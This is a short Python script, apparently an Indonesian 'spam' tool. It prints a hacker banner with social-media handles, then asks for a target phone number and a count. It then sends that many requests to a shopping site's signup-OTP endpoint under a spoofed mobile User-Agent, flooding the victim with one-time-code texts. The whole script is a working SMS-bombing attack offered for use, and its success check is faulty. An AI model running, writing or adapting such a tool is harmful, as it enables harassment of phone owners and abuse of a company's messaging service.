import json
import requests
import sys
import os


def main():
	os.system('clear')
	os.system('figlet Umbu4y')
	banner= '''

❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗
❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗
❕❕❕❕❕❕❕❕❕❕❕❕❕❕❕❕❕
❕❕❕❕❕❕❕❕❕❕❕❕❕❕❕❕❕
 🇮🇩 [+]H4CKING : Umbu2004
 🇮🇩 [+]INSTAGRAM : umbu_praingg
 🇮🇩 [+]FACEBOOK : UPraing☠
 🇮🇩 [+]WA : 08311318****☠ヾ(@^▽^@)ノ
 🇮🇩 [©]-10.182554,123.669855
 🇮🇩 [©]✝✡✝✡✝
 🇮🇩 [©]אני אבוד
 🇮🇩 [©]butuh_titik_terang💡
❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗
❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗
❕❕❕❕❕❕❕❕❕❕❕❕❕❕❕❕❕
❕❕❕❕❕❕❕❕❕❕❕❕❕❕❕❕❕
	المسيح هو دليلي والمسيحي هو خياري
المسيح هو دليلي والمسيحي هو خياري
المسيح هو دليلي والمسيحي هو خياري
github.com by anonymus
	'''

	print(banner)
	no = input('no target : ')
	jum = input('jumlah spam : ')

	head= {
	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
	"Referer": "https://www.mapclub.com/en/user/signup",
	"Host": "cmsapi.mapclub.com",
	}

	dat = {
	'phone' : no
	}
	for x in range(int(jum)):
		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
	if 'eror' in leosureo:
		print('gagal spam' + no)
	else:
		print('succses spam' + no)




main()
